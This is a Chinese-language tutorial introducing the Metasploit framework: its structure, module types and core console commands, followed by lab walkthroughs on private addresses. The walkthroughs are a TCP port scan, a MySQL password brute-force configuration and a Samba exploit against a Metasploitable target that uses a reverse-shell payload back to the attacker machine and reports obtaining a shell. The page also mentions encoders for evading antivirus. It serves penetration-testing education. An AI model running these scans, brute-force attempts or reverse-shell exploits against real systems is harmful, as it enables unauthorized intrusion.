
# Metasploit 基本介绍
	Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。团队合作，在Metasploit和综合报告提出了他们的发现。通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为Metasploit团队一直都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。


# Metasploit 体系框架
**1、基础库**<br />	metasploit 基础库文件位于源码根目录路径下的libraries目录中，包括Rex,framework-core和framework-base三部分。

- Rex是整个框架所依赖的最基础的一些组件,如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、PostgreSQL 以及MySQL数据库支持等
- framework-core库负责实现所有与各种类型的上层模块及插件的交互接口
- framework-base库扩展了framework-core ,提供更加简单的包装例程,并为处理框架各个方面的<br />功能提供了一些功能类,用于支持用户接口与功能程序调用框架本身功能及框架集成模块;

**2、模块**<br />	模块组织按照不同的用途分为6种类型的模块( Modules ) : 辅助模块( Aux)、渗透攻击模块( Exploits)、后渗透攻击模块( Post)、攻击载荷模块( payloads)、编码器模块( Encoders)、空指令模块( Nops)。<br />注：payload又称为攻击载荷,主要是用来建立目标机与攻击机稳定连接的,可返回shell ,也可以进行程序注入等。

**3、插件**<br />	插件能够扩充框架的功能,或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具,如Nessus、OpenVAS 漏洞扫描器等,为用户接口提供一些新的功能。

**4、接口**<br />	包括msfconsole控制终端、msfcli 命令行、msfgui 图形化界面、armitage 图形化界面以及msfapi远程调用接口。

**5、功能程序**:<br />	metasploit 还提供了一系列可直接运行的功能程序 ,支持渗透测试者与安全人员快速地利用metasploit框架内部能力完成一些特定任务。比如msfpayload、msfencode和msfvenom可以将攻击载荷封装为可执行文件、C语言、JavaScript 语言等多种形式,并可以进行各种类型的编码。


# Meatsploit 目录结构
meatspolit的工作目录在`/usr/share/metasploit-framework`中<br />![](https://img-blog.csdnimg.cn/acac7f6229e2476c955620b9b1dec9f0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=hq7EN&originHeight=240&originWidth=1838&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

- data：meatsploit使用的可编辑文件
- documentation：为框架提供文档
- lib：框架代码库
- modules：实际的MSF模块
- plugins：可以在运行时加载的插件
- scripts：Meatsploit和其它脚本
- tools：各种有用的命令行工具


# Metasploit 基础

## 专业术语

1. **Auxiliaries（辅助模块）**<br />该模块不会直接在测试者和目标机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。

2. **Exploit（漏洞利用模块）**<br />漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。流行的渗透测试攻击技术包括缓冲区溢出，Web应用程序攻击以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个系统漏洞都有相应的攻击代码。

3. **Payload（攻击载荷模块）**<br />攻击载荷是指我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由的选择、传送和植入。攻击载荷也可能是简单的在目标操作系统上执行一些命令，如添加用户账号等。

4. **Post（后期渗透模块）**<br />该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息，实施跳板攻击等

5. **Encoders（编码工具模块）**<br />该模块在渗透测试中负责免杀，以防止被杀毒软件，防火墙，IDS及类似的安全软件检测出来。


## 渗透攻击步骤
	使用MSF进行渗透测试时，可以综合使用以上模块对目标系统进行侦察并发动攻击，大致步骤如下所示：

- 1. 扫描目标机系统，寻找可用漏洞。
- 2. 选择并配置一个漏洞利用模块。
- 3. 选择并配置一个攻击载荷模块。
- 4. 选择一个编码技术，用来绕过杀毒软件的查杀。
- 5. 渗透测试。

# Meatsploit 基本命令

### 启动
在终端输入msfconsole即可启动<br />![](https://img-blog.csdnimg.cn/72e80985f56b4b78bf2e302caf3c9189.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=SYU8A&originHeight=555&originWidth=778&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


### show命令
show命令的有效参数是:all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info,options
```
show exploits    #列出框架中的所有渗透攻击模块。
show payload     #列出metasploit框架中的所有攻击载荷。
show auxiliary   #列出metasploit框架中的所有辅助攻击载荷。
show options     #查看利用的模块相关信息
```


### search命令
search主要是用来进行搜索的命令
```
search mysql    #查找mysql漏洞模块
search ms08-067  #查找ms08-067漏洞模块
search CVE-2017-8464  #查找CVE-2017-8464漏洞模块
```


### use命令
确定了需要使用的模块，用use命令来利用该模块<br />![](https://img-blog.csdnimg.cn/4fa2e13099fa49fd834925d0905273d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=GrXax&originHeight=391&originWidth=1733&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


### info命令
info用来查看模块的相关信息<br />![](https://img-blog.csdnimg.cn/3bab478fd4204bc3bbe44f5d740e433b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=rHCFN&originHeight=466&originWidth=995&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


### show options命令
查看利用模块需要配置的相关信息<br />![](https://img-blog.csdnimg.cn/a360a0a846134e0693d69762ef6998ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=zRwxS&originHeight=631&originWidth=1534&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


### set命令
set设置所利用的模块的配置<br />![](https://img-blog.csdnimg.cn/fe26823f6b20412f85a9322900ca76d8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=XmWUm&originHeight=606&originWidth=1519&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


### 运行攻击
使用exploit或者run就可以开始执行攻击了。<br />![](https://img-blog.csdnimg.cn/96ee32007a3f49c8bd503558cd41f614.png#crop=0&crop=0&crop=1&crop=1&id=vGAZQ&originHeight=126&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# Metasploit 主机扫描

## 端口扫描
**环境**<br />攻击机：kali（192.168.1.28）<br />边界主机：Win7（192.168.1.8、10.10.10.2）<br />内网主机：WinXP（10.10.10.3）

使用search搜索可以利用的模块
```
search portscan
```
![](https://img-blog.csdnimg.cn/6557b0dace204459a16307a58a8d6926.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=tIau7&originHeight=498&originWidth=1706&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

以TCP扫描为例，利用`auxiliary/scanner/portscan/tcp`模块
```
use 5
```
![](https://img-blog.csdnimg.cn/fafdb4d0c4de4aebbf0365f5f83b3ff0.png#crop=0&crop=0&crop=1&crop=1&id=w4FSg&originHeight=67&originWidth=546&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

查看需要设置的参数
```
show options
```
![](https://img-blog.csdnimg.cn/4bd8ac625d4d4f0bb01b99b0def7c8d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=XKagK&originHeight=321&originWidth=1387&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

设置IP和端口
```
set rhosts 192.168.1.8
set ports 80
```
![](https://img-blog.csdnimg.cn/0cef1976e05e47d98007f929f0a5d0c3.png#crop=0&crop=0&crop=1&crop=1&id=jSew9&originHeight=98&originWidth=693&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

开始扫描
```
run
```
![](https://img-blog.csdnimg.cn/cbfed062663340bb9463c925622166f1.png#crop=0&crop=0&crop=1&crop=1&id=cPBTv&originHeight=140&originWidth=729&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 服务扫描
**环境**<br />攻击机：kali（192.168.1.28）<br />边界主机：Win7（192.168.1.8、10.10.10.2）<br />内网主机：WinXP（10.10.10.3）

以扫描Mysql弱密码为例<br />搜索可利用模块
```
 search mysql_login
```
![](https://img-blog.csdnimg.cn/786968649e5f4a728d5a6d341fba90c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=fn50N&originHeight=256&originWidth=1216&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

利模块并查看需要设置的参数
```
use 0
show options
```
![](https://img-blog.csdnimg.cn/3a883f62c6b3423db284dabbef952fca.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=P4P4f&originHeight=566&originWidth=1428&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

设置IP
```
set rhosts 192.168.1.8
```
![](https://img-blog.csdnimg.cn/fbc43cd961a14c6daf0201beadd06eec.png#crop=0&crop=0&crop=1&crop=1&id=DX4BG&originHeight=83&originWidth=740&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

也可以设置指定账户和密码字典
```
set PASS_FILE xxxx
set USER_FILE xxxx
```

开始扫描
```
run
```
![](https://img-blog.csdnimg.cn/b9e88a970fcd4eec8768d2a263fb7a11.png#crop=0&crop=0&crop=1&crop=1&id=CC8FC&originHeight=140&originWidth=1127&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
显示`Unsupported target version of MySQL detected. Skipping.`(检测到不支持的MySQL目标版本。跳过)


## 使用Nmap扫描
有关Nmap更多内容见：[Nmap](https://www.yuque.com/xmtxsec/tools/xm1y1f)
![](https://img-blog.csdnimg.cn/bce8295eef5d4d1089d93b12f564c7c6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=hRREW&originHeight=490&originWidth=1077&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# Metasploit 漏洞利用
**环境**<br />攻击机：kali（192.168.1.28）<br />靶机：Metasploitable（192.168.1.18）

端口扫描
```
nmap -sV 192.168.1.18
```
![](https://img-blog.csdnimg.cn/d03ee4e9955f4daaabffb28e4215da2a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Bjaen&originHeight=567&originWidth=964&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以发现主机运行这Samba3.x的服务，查找县相关漏洞利用模块
```
search samba
```
![](https://img-blog.csdnimg.cn/febf8bfa182d430c94057037828873e6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=GWh3m&originHeight=366&originWidth=971&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

查看漏洞相关信息，输入对应的编号即可
```
info 8
```
![](https://img-blog.csdnimg.cn/bfd2f90e8cea46598ef6f312611cd573.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=OKnrl&originHeight=529&originWidth=967&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

利用相关模块，查看并配置参数
```
use 8	#利用模块
show options	#查看参数
set payload cmd/unix/reverse	#设置payload
set rhosts 192.168.1.18    #配置目标机IP
set rport 445	#配置目标机端口
set lhost 192.168.1.28	#配置攻击机IP
```
![](https://img-blog.csdnimg.cn/db6f427243424a9a93fff7245b901c51.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=bJbrf&originHeight=504&originWidth=968&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

开始攻击
```
run
```

成功拿到shell<br />![](https://img-blog.csdnimg.cn/0a9bd96fba4f46d39e3ae7bea600aac5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=cStjD&originHeight=383&originWidth=968&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)













